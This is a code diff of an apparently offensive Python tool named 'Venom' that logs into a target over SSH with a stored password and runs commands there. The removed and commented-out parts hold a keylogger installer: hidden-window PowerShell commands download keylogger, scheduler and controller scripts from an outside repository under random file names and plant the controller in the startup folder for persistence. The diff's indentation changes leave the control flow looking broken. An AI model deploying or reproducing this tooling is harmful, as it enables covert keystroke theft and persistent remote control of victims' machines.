@@ -42,8 +42,8 @@ options_menu = """
 """
 
 username = getpass.getuser()
-header = f"{username}@venomspit $"
-remote_path = "raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/tree/master/Venom"
+header = f"[~] {username}@venomspit $"
+remote_path = "https://github.com/P0k3m0n-unleashed/ProjSucc/tree/master/Venom"
 local_path = f"/home/{username}/.Venom" if username != "root" else "/root/.Venom"
 
 #random text generator for obfuscation
@@ -70,9 +70,12 @@ def read_config(config_file):
 	configuration["IPADDRESS"] = read_lines[0].strip()
 	configuration["PASSWORD"] = read_lines[1].strip()
 	configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
-	configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
+	# configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
 	
 	return configuration
+
+def clear():
+	os.system("clear")
 	
 def os_detection():
 	#windows
@@ -88,10 +91,33 @@ def connect(address, password):
 	#REMOTELY connect
 	os.system(f"sshpass -p \"{password}\" ssh venomspit@{address}")
 	 
-#remote upload with scp
-def remote_upload(address, password, upload, path):
-	#scp upload
-	os.system(f"sshpass -p \"{password}\" scp {upload} venomspit@{address}:{path} ")
+# #remote upload with scp
+# def remote_upload(address, password, upload, path):
+# 	#scp upload
+# 	os.system(f"sshpass -p \"{password}\" scp {upload} venomspit@{address}:{path}")
+# f keylogger(address, password, startup_directory, working_directory):
+
+# 	#Prepping
+# 	print("\n[+]...Prepping Keylogger...")
+
+# 	#web requests
+# 	keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/keylogger.ps1 -OutFile {working_directory}/KVbOiPPcus.ps1\""
+
+# 	scheduler_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/scheduler.ps1 -OutFile {working_directory}/SSzsjvouBw.ps1\""
+
+# 	controller_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/controller.cmd -OutFile \"{startup_directory}/qdObbfWbxi.cmd\""
+
+# 	#remote command execution
+# 	print("[*] Installing Keylogger....")
+# 	remote_command(address, password, keylogger_command)
+
+# 	print("[*] Installing Scheduler....")
+# 	remote_command(address, password, scheduler_command)
+
+# 	print("[*] Installing Controller....")
+# 	remote_command(address, password, controller_command)
+
+# 	print("[+] Keylogger installed Successfully")
 
 #remote download with scp
 def remote_download(address, password, download, path):
@@ -102,34 +128,19 @@ def remote_download(address, password, download, path):
 #run commmands remotely with SCP
 def remote_command(address, password, command):
 	#remote command execution
-	os.system(f"sshpass -p \{password}\" ssh venomspit@{address} '{command}'")
+	os.system(f"sshpass -p \"{password}\" ssh venomspit@{address} '{command}'")
 
 #keylogger
-def keylogger(address, password, startup_directory, working_directory):
-
-	#web requests
-	keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/keylogger.ps1 -OutFile {working_directory}/KVbOiPPcus.ps1\""
-
-	scheduler_command = "powershell.exe \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/scheduler.ps1 -OutFile {working_directory}/SSzsjvouBw.ps1\""
-
-	controller_command = "powershell.exe \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/controller.cmd -OutFile {startup_directory}/qdObbfWbxi.cmd\""
-
-	#remote command execution
-	remote_command(address, password, keylogger_command)
-	remote_command(address, password, scheduler_command)
-	remote_command(address, password, controller_command)
-
-
-
-	#building controller
-	with open(obfuscated_controller, "w") as f:
-		f.write("@echo off")
-		f.write(f"powershell Start-Process powershel.exe -windowstyle hidden \{}")
+# de
+	# #building controller
+	# with open(obfuscated_controller, "w") as f:
+	# 	f.write("@echo off")
+	# 	f.write(f"powershell Start-Process powershel.exe -windowstyle hidden \{}")
 
 	#remote_upload
-	remote_upload(ipv4, password, obfuscated_controller, startup_directory) #controller
-	remote_upload(ipv4, password, obfuscated_keylogger, working_directory) #keylogger
-	remote_upload(ipv4, password, obfuscated_scheduler, working_directory) #scheduler
+	# remote_upload(ipv4, password, obfuscated_controller, startup_directory) #controller
+	# remote_upload(ipv4, password, obfuscated_keylogger, working_directory) #keylogger
+	# remote_upload(ipv4, password, obfuscated_scheduler, working_directory) #scheduler
 
 
 #terminate program
@@ -155,19 +166,19 @@ def cli(arguments):
 			exit()
 	
 		#get config info
-		ipv4 = configuration.get("IPADDRESS")
-		password = configuration.get("PASSWORD")
-		working_directory = (configuration.get("WORKINGDIRECTORY"))
-		startup_directory = (configuration.get("STARTUPDIRECTORY"))
-		
+			ipv4 = configuration.get("IPADDRESS")
+			password = configuration.get("PASSWORD")
+			working_directory = (configuration.get("WORKINGDIRECTORY"))
+			# startup_directory = (configuration.get("STARTUPDIRECTORY"))
+			
 		#remote console
-		if option == "0":
-			connect(ipv4, password)
+	if option == "0":
+		connect(ipv4, password)
 
-		#keylogger option
-		elif option ==  "1":
-		 	keylogger(ipv4, password, startup_directory, working_directory)
-	#if not
+	# 	#keylogger option
+	# elif option ==  "1":
+	# 	keylogger(ipv4, password, startup_directory, working_directory)
+	# #if not
 	else:
 		print(help_menu)
 	
